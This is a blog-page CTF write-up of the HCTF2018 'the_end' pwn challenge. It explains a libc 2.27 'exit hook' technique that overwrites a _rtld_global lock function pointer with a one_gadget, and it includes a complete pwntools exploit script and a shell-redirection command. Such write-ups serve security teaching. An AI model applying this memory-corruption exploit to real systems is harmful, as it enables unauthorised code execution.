@@ -1,0 +1,281 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>HCTF2018 THE_END(exit hook) | kotori的菜园</title>
+<link rel="shortcut icon" href="https://kotoriseed.github.io//favicon.ico?v=1718591155332">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://kotoriseed.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="HCTF2018 THE_END(exit hook) | kotori的菜园 - Atom Feed" href="https://kotoriseed.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-PJDEM99E9P"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-PJDEM99E9P');
+</script>
+
+
+    <meta name="description" content="分析
+在buu的环境打的这题。
+
+除了canary以外的保护都开了。
+
+main函数一开始给了sleep函数的真实地址，可以直接拿到libc基址，然后close掉了stdout和stderr。问题不大，getshell过后用'exec /b..." />
+    <meta name="keywords" content="刷题,tricks" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://kotoriseed.github.io/">
+  <img class="avatar" src="https://kotoriseed.github.io//images/avatar.png?v=1718591155332" alt="">
+  </a>
+  <h1 class="site-title">
+    kotori的菜园
+  </h1>
+  <p class="site-description">
+    挑战者贵为永恒黄金
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              HCTF2018 THE_END(exit hook)
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-03-31
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+                <a href="https://kotoriseed.github.io/tag/rQaLED_Cv/" class="post-tag">
+                  # 刷题
+                </a>
+              
+                <a href="https://kotoriseed.github.io/tag/lEdq9BfNl/" class="post-tag">
+                  # tricks
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="分析">分析</h1>
+<p>在buu的环境打的这题。</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/31/0b8343e242390.png" alt="1648710169526.png" loading="lazy"></figure>
+<p>除了canary以外的保护都开了。</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/31/33c11863e4e14.png" alt="1648710281809.png" loading="lazy"></figure>
+<p>main函数一开始给了sleep函数的真实地址，可以直接拿到libc基址，然后close掉了stdout和stderr。问题不大，getshell过后用'exec /bin/sh 1&gt;&amp;0'重定向一下输出就可以了。</p>
+<p>vul非常明显，就是送了5个字节的任意写，由于这题got表不可改，所以可以在_ IO_2_1_stdout_附近，利用一些现有值，改掉低字节来伪造出一个vtable，然后把setbuf的函数指针改成one_gadget的地址，就能getshell。</p>
+<p>改setbuf是因为函数最后调用的exit会用到。</p>
+<p>附件我是在github上找的，在连接到远程环境的时候发现buu远程使用的并不是原题的libc2.23，而是后来的libc2.27。在libc2.27中，会对vtable的地址进行检查，而这题的原本解法并不能通过这个检查，而且任意写的机会只有5次，每次一个字节，所以不得不换别的思路做了。</p>
+<p>exit函数会调用__run_exit_hand函数，进而调用 _dl_fini， _dl_fini的关键源码如下：</p>
+<pre><code class="language-c"> 1 #ifdef SHARED
+ 2   int do_audit = 0;
+ 3  again:
+ 4 #endif
+ 5   for (Lmid_t ns = GL(dl_nns) - 1; ns &gt;= 0; --ns)
+ 6     {
+ 7       /* Protect against concurrent loads and unloads.  */
+ 8       __rtld_lock_lock_recursive (GL(dl_load_lock));
+ 9 
+10       unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;
+11       /* No need to do anything for empty namespaces or those used for
+12      auditing DSOs.  */
+13       if (nloaded == 0
+14 #ifdef SHARED
+15       || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit
+16 #endif
+17       )
+18     __rtld_lock_unlock_recursive (GL(dl_load_lock));
+</code></pre>
+<p>在_dl_fini的内部又调用了__rtld_lock_recursive，他实际上是一个名叫 _rtld_global的结构体中的一个函数指针，并且在libc2.27中并没有相关的检查机制。</p>
+<p>所以我们可以把他劫持了，写入one_gadgets来getshell。</p>
+<p>而这种trick就是常说的exit hook。</p>
+<p>值得一提的是，_rtld_global在ld文件里，所以在知道了libc基址过后，还需要推算一下ld的基址。</p>
+<h1 id="exp">exp</h1>
+<pre><code class="language-python">from pwn import *
+context(os='linux', arch='amd64', log_level='debug')
+p = process('./the_end')
+# p = remote('node4.buuoj.cn', 29971)
+elf = ELF('./the_end')
+libc = ELF('./libc-2.27.so')
+ld = ELF('./ld-2.27.so')
+
+p.recvuntil('0x')
+sleep_addr = int(p.recv(12), 16)
+libcbase = sleep_addr - libc.symbols['sleep']
+ldbase = libcbase + 0x3f1000
+rtld_global = ldbase + ld.symbols['_rtld_global']
+dl_rtld_lock_recursive = rtld_global + 0xf08
+print(hex(libcbase))
+print(hex(ldbase))
+print(hex(rtld_global))
+
+one = [0x4f2c5, 0x4f322, 0x10a38c]
+
+for i in range(5):
+        p.send(p64(dl_rtld_lock_recursive+i))
+        p.send(p8(p64(libcbase + one[1])[i]))
+
+# gdb.attach(p, 'b *exit')
+
+'''
+vtable = libcbase + 0x3ec758
+print(hex(libcbase))
+
+fakevtable = libcbase + 0x3ec690
+setbuf = libcbase + 0x3ec6e8
+
+one = [0x4f2c5, 0x4f322, 0x10a38c]
+
+gdb.attach(p)
+
+for i in range(2):
+	p.send(p64(vtable+i))
+	p.send(p8(p64(fakevtable)[i]))
+
+for i in range(3):
+	p.send(p64(setbuf+i))
+	p.send(p8(p64(libcbase + one[2])[i]))
+
+# print(hex(libcbase + one[1]))
+# gdb.attach(p)
+'''
+
+p.interactive()
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%88%86%E6%9E%90">分析</a></li>
+<li><a href="#exp">exp</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://kotoriseed.github.io/post/成理工恐龙杯pwn/">
+              <h3 class="post-title">
+                成理工恐龙杯-PWN-WP
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://kotoriseed.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
